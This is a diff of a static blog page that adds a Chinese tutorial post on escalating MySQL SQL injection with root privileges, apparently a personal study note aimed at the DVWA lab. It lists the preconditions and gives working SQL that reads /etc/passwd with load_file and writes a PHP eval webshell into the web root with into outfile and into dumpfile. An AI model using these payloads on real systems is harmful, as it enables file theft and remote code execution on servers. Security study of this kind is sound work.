@@ -30,30 +30,35 @@
       
         <div class="animated fadeInLeft" style="animation-delay: 0.4s">
           <p class="my-4 text-gray-600 font-light hidden lg:block">
-            我等着，等着你
+            文章目录
           </p>
-          <div class="animated fadeInLeft social-container hidden lg:block" style="animation-delay: 0.6s">
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#mysql%E6%89%8B%E6%B3%A8%E4%B9%8Broot%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86">MySQL手注之Root权限处理</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83%E6%9D%A1%E4%BB%B6">提权条件</a></li>
+<li><a href="#%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0">常用到的函数</a>
+<ul>
+<li><a href="#load_file">load_file()</a></li>
+<li><a href="#into-outfile-into-dumpfile">into outfile()、into dumpfile()</a>
+<ul>
+<li><a href="#into-outfile">into outfile()</a></li>
+<li><a href="#into-dumpfile">into dumpfile()</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a></li>
+<li><a href="#%E9%99%84%E5%BD%95">附录</a>
+<ul>
+<li><a href="#magic_quote_gpc">magic_quote_gpc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
           </div>
         </div>
       
@@ -97,33 +102,110 @@
 </div>
 <div class="mask" onclick="closeMenu()">
 </div>
-      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4">
-        <h2 class="text-lg text-gray-700 mb-8">
-          <i class="ri-bookmark-line"></i> 部署
-        </h2>
-        
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${0 * 0.2}s` }">
-    
-      <a href="https://Morn-zh.github.io/post/gunicorngevent-bu-shu-flask/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://Morn-zh.github.io/post-images/cover_code.jpg'">
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">MySQL手注之Root权限处理</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-16 / 3 min read
         </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://Morn-zh.github.io/post/gunicorngevent-bu-shu-flask/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">gunicorn+gevent部署flask</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
         
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-09-15 / 4 min read</div>
-    </div>
-  </section>
+        <div class="post-content yue">
+          <h1 id="mysql手注之root权限处理">MySQL手注之Root权限处理</h1>
+<p>学前疑问：</p>
+<ul>
+<li>注入的目的是啥？
+<ul>
+<li>得到数据库中的数据？</li>
+<li>得到目标的控制权限？</li>
+</ul>
+</li>
+</ul>
+<h2 id="原理">原理</h2>
+<p>利用写入函数写入一句话木马、后续shell连接的代码等（大概~</p>
+<h2 id="提权条件">提权条件</h2>
+<ul>
+<li>
+<p>当前操作数据库的用户为root权限</p>
+</li>
+<li>
+<p>能够得到到物理地址（报错、phpinfo页⾯、猜、爆破），后续的写入地址需要用到</p>
+</li>
+<li>
+<p>能够判断数据库的版本，从而决使用什么注入函数</p>
+<ul>
+<li>
+<p>5.5.53前，my.ini中<strong>secure_file_priv</strong> 变量默认为空，所以默认情况下是<strong>可以直接通过SQL语句来导出</strong>⽂件的。</p>
+</li>
+<li>
+<p>5.5后，mysql推出secure_file_priv变量，用于控制文件的写入导出</p>
+<ul>
+<li>
+<p>当 secure_file_priv 的值为null ，表⽰限制mysqld 不允许导⼊|导出</p>
+</li>
+<li>
+<p>当 secure_file_priv 的值为/tmp/ ，表⽰限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下</p>
+</li>
+<li>
+<p>当 secure_file_priv 的值为空，即 '' ，表⽰不对mysqld 的导⼊|导出做限制。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="常用到的函数">常用到的函数</h2>
+<h3 id="load_file">load_file()</h3>
+<p>读取文件</p>
+<pre><code>select load_file('/etc/passwd'); 
 
-        <div class="pagination-container animated fadeIn">
-  
-  
-</div>
+select load_file(0x2F6574632F706173737764);
+</code></pre>
+<h3 id="into-outfile-into-dumpfile">into outfile()、into dumpfile()</h3>
+<p>写入文件</p>
+<h4 id="into-outfile">into outfile()</h4>
+<p>into outfile()写入时会在每行结束时<strong>⾃动加上换⾏符</strong></p>
+<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into outfile '/var/www/html/muma.php' ;
+</code></pre>
+<h4 id="into-dumpfile">into dumpfile()</h4>
+<p>into dumpfile()函数写入<strong>原⽣内容</strong>，常用于写入<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/996661?fr=aladdin">⼆进制⽂件</a></p>
+<pre><code>select '&lt;?php @eval($_POST[pass])?&gt;' into DUMPFILE '/var/www/html/muma.php' ;
+</code></pre>
+<p>以下仅限配合into dumpfile()（未验证）</p>
+<pre><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; lines starting by 'xxxx' 
+</code></pre>
+<p>lines starting by '写⼊的内容' 设置<strong>每⾏数据开头</strong>的字符，可以为单个或多个字符，默认情况下不使⽤任何字符</p>
+<p>lines terminated by '写⼊的内容' 设置<strong>每⾏数据结尾</strong>的字符，可以为单个或多个字符，默认值是&quot;\n&quot;。</p>
+<p>所以说into outfile()就是into dumpfile()的简约版本？嘿嘿~</p>
+<h2 id="实践">实践</h2>
+<p>目标：dvwa</p>
+<p>未完待续</p>
+<h2 id="附录">附录</h2>
+<h3 id="magic_quote_gpc">magic_quote_gpc</h3>
+<p>魔术引号~会对输入的特殊符号进行转义</p>
+<p>参考资料</p>
+<p>https://blog.csdn.net/niexinming/article/details/49109683</p>
+<p>https://www.jb51.net/article/29462.htm</p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-yan-shi-mang-zhu-ji-yu-shi-jian-de-mang-zhu/">
+                <h3 class="post-title">
+                  MySQL手注之延时盲注(基于时间的盲注)
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
 
       </div>
     </div>
